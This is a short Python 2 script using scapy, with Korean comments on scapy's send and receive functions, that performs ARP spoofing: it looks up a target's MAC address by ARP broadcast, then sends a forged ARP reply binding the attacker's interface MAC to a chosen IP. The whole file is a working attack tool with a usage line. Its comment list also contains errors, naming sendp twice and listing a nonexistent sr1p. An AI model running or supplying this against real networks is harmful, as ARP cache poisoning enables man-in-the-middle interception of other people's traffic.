#!-*- coding:utf-8 -*- 
from scapy.all import *
from sys import argv

'''
sendp() : 자체 ether() 계층없이 전송
sendp() : 자체 ether() 계층으로 전송
sr()    : 자체 ether() 계층없이 전송 및 수신
srp()   : 자체 ether() 계층으로 전송 및 수신
sr1()   : 자체 ether() 계층없이 전송하고 첫 번째 답을 기다림
sr1p()  : 자체 ether() 계층으로 패킷을 전송하고, 답을 기다림
'''

def getMacByIP(host):
  try:
      ans,unans = srp( Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host) )
      for s,r in ans:
          return r.src

  except Exception, e:
      return e

def sendarp(smac, dmac, sip, dip):
    sendp(Ether(src=smac, dst=dmac) / ARP(hwsrc=smac, psrc=sip, hwdst=dmac, pdst=dip))

if __name__=='__main__':
    if len(argv) < 4:
        print "Usage: %s <INTERFACE> <SENDER IP> <TARGET IP>" % argv[0]
        exit(0)
    try:
        inf = get_if_hwaddr( argv[1] )
        sender_ip = argv[2]
        target_ip = argv[3]

    except:
        print "%s is not activated" % argv[1]
        exit(0)
    
    sendarp( inf, getMacByIP( target_ip ),
             sender_ip, target_ip )
